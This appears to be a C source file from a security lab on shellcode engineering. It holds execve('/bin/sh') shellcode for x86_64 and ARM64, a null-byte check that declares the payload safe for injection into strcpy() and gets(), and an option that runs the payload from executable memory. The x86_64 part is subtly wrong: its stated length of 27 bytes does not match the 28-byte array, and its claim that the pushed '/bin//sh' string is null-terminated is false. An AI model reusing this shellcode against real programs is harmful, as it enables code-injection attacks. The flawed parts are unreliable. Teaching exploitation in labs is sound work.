/**
 * Linux Kernel Hardening Lab - Principles Track 3: Shellcode Architecture & Engineering
 * labs/principles/04-shellcode/shellcode_tester.c
 *
 * Demonstrates:
 * 1. Machine opcode breakdown of an execve("/bin/sh") payload.
 * 2. Why null-byte (\x00) elimination is necessary for string-copy vulnerabilities.
 * 3. Position-independent execution using mmap(PROT_READ|PROT_WRITE|PROT_EXEC).
 * 4. Dual-architecture support (x86_64 & ARM64).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>

/*
 * x86_64 execve("/bin/sh", NULL, NULL) Null-Free Shellcode (27 bytes)
 *
 * Assembly breakdown:
 *   31 c0                   xor    %eax, %eax           ; EAX = 0 (Null terminator)
 *   48 bb 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f, %rbx ; RBX = "/bin//sh" (8 bytes)
 *   2f 73 68
 *   53                      push   %rbx                 ; Push "/bin//sh\0" to stack
 *   48 89 e7                mov    %rsp, %rdi           ; RDI = Pointer to "/bin//sh" (arg1)
 *   50                      push   %rax                 ; Push NULL
 *   48 89 e2                mov    %rsp, %rdx           ; RDX = NULL envp (arg3)
 *   57                      push   %rdi                 ; Push pointer to "/bin//sh"
 *   48 89 e6                mov    %rsp, %rsi           ; RSI = argv ["/bin//sh", NULL] (arg2)
 *   b0 3b                   mov    $0x3b, %al           ; RAX = 59 (__NR_execve)
 *   0f 05                   syscall                     ; Invoke kernel syscall
 */
static const unsigned char x86_64_shellcode[] = {
    0x31, 0xc0,
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
    0x53,
    0x48, 0x89, 0xe7,
    0x50,
    0x48, 0x89, 0xe2,
    0x57,
    0x48, 0x89, 0xe6,
    0xb0, 0x3b,
    0x0f, 0x05
};

/*
 * ARM64 execve("/bin/sh", NULL, NULL) Position-Independent Shellcode (28 bytes)
 *
 * Assembly breakdown:
 *   a0 00 00 10             adr    x0, #20              ; X0 = pointer to "/bin/sh" string
 *   e1 03 1f aa             mov    x1, xzr              ; X1 = NULL argv
 *   e2 03 1f aa             mov    x2, xzr              ; X2 = NULL envp
 *   a8 1b 80 d2             mov    x8, #0xdd            ; X8 = 221 (__NR_execve)
 *   01 00 00 d4             svc    #0                   ; Supervisor call
 *   2f 62 69 6e 2f 73 68 00 .string "/bin/sh"           ; Embedded null-terminated string
 */
static const unsigned char arm64_shellcode[] = {
    0xa0, 0x00, 0x00, 0x10, /* adr x0, #20 -> points to "/bin/sh" */
    0xe1, 0x03, 0x1f, 0xaa, /* mov x1, xzr */
    0xe2, 0x03, 0x1f, 0xaa, /* mov x2, xzr */
    0xa8, 0x1b, 0x80, 0xd2, /* mov x8, #221 (__NR_execve) */
    0x01, 0x00, 0x00, 0xd4, /* svc #0 */
    0x2f, 0x62, 0x69, 0x6e, /* "/bin" */
    0x2f, 0x73, 0x68, 0x00  /* "/sh\0" */
};

void inspect_shellcode(const unsigned char *code, size_t len, const char *arch_name)
{
    printf("\n============================================================\n");
    printf(" Shellcode Inspection [%s] (Total Length: %zu bytes)\n", arch_name, len);
    printf("============================================================\n");

    int null_bytes = 0;
    printf("[Hex Dump]\n  ");
    for (size_t i = 0; i < len; i++) {
        printf("\\x%02x", code[i]);
        if (code[i] == 0x00) {
            null_bytes++;
        }
        if ((i + 1) % 12 == 0 && i + 1 < len) {
            printf("\n  ");
        }
    }
    printf("\n\n");

    printf("[Analysis]\n");
    if (null_bytes == 0) {
        printf("  [+] Null-Byte Check: PASSED (0 null bytes detected).\n");
        printf("      Safe for injection into strcpy(), gets(), sprintf().\n");
    } else {
        printf("  [-] Null-Byte Check: WARNING (%d null byte(s) detected).\n", null_bytes);
    }
    printf("============================================================\n");
}

int main(int argc, char *argv[])
{
    printf("=== Linux Kernel Hardening Lab - Shellcode Engineering ===\n");

    /* Educational comparison: inspect both x86_64 and ARM64 opcodes */
    inspect_shellcode(x86_64_shellcode, sizeof(x86_64_shellcode), "x86_64");
    inspect_shellcode(arm64_shellcode, sizeof(arm64_shellcode), "ARM64");

#if defined(__x86_64__)
    const unsigned char *target_code = x86_64_shellcode;
    size_t code_len = sizeof(x86_64_shellcode);
#elif defined(__aarch64__)
    const unsigned char *target_code = arm64_shellcode;
    size_t code_len = sizeof(arm64_shellcode);
#else
    const unsigned char *target_code = NULL;
    size_t code_len = 0;
#endif

    if (argc > 1 && strcmp(argv[1], "--execute") == 0) {
        printf("\n[!] WARNING: Executing shellcode into active shell (execve /bin/sh)...\n");
        printf("[!] If successful, you will enter a new shell session. Type 'exit' to return.\n\n");

        /* Allocate RWX memory page to simulate vulnerable non-NX environment */
        void *exec_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (exec_mem == MAP_FAILED) {
            perror("[-] mmap failed");
            return 1;
        }

        memcpy(exec_mem, target_code, code_len);
        void (*shell_fn)(void) = (void (*)(void))exec_mem;

        /* Jump to shellcode */
        shell_fn();
    } else {
        printf("[i] Run with './shellcode_tester --execute' or 'make run-exec' to jump into shellcode.\n");
    }

    return 0;
}
